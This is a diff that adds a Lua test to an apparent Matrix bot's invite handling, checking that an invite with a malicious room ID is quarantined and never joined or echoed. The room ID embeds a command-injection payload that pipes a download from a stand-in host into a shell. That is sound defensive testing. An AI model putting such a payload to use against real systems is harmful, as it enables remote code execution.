@@ -604,6 +604,33 @@ local function test_conflicting_inviter_events_cannot_join()
   assert(ok, err)
 end
 
+local function test_unsafe_invite_room_is_quarantined_without_home_notice()
+  local dir, path = invite_fixture()
+  local before = read_text(path)
+  local hostile_room = "!x:evil.org'; curl evil|sh; '"
+  local client, delivered = invite_client(), {}
+  local relay = started_relay(path, client, delivered)
+  local invitation = { [hostile_room] = { invite_state = { events = {
+    { type = "m.room.member", sender = STRANGER, state_key = "@bot:example.org",
+      content = { membership = "invite" } },
+  } } } }
+  local ok, err = pcall(function()
+    client:sync({ json = { next_batch = "s1", rooms = { invite = invitation } } })
+    client:pump()
+    assert(client:joins(hostile_room) == 0, "an unsafe room ID must never be joined")
+    assert(read_text(path) == before, "an unsafe room ID must not change the config")
+    local item
+    for _, q in ipairs(relay:quarantine_list()) do
+      if q.reason == "invite_not_allowlisted" then item = q end
+    end
+    assert(item and item.room_id == hostile_room, "the unsafe invite must still be quarantined")
+    assert(client:messages(HOME, "Invite to") == 0, "an unsafe room ID must not appear in a HOME command")
+  end)
+  relay:stop()
+  remove_dir(dir)
+  assert(ok, err)
+end
+
 local function test_agent_invite_is_not_joined()
   local agents = { "@agent-x:example.org", "@butler-x:example.org" }
   local dir, path = invite_fixture(OWNER .. "," .. table.concat(agents, ","))
@@ -777,6 +804,7 @@ for _, case in ipairs({
   { "test_owner_invite_joins_writes_line_and_notices_once", test_owner_invite_joins_writes_line_and_notices_once },
   { "test_stranger_invite_is_quarantined_with_home_next", test_stranger_invite_is_quarantined_with_home_next },
   { "test_conflicting_inviter_events_cannot_join", test_conflicting_inviter_events_cannot_join },
+  { "test_unsafe_invite_room_is_quarantined_without_home_notice", test_unsafe_invite_room_is_quarantined_without_home_notice },
   { "test_agent_invite_is_not_joined", test_agent_invite_is_not_joined },
   { "test_join_failure_rolls_back_room_line", test_join_failure_rolls_back_room_line },
   { "test_joined_room_survives_restart", test_joined_room_survives_restart },
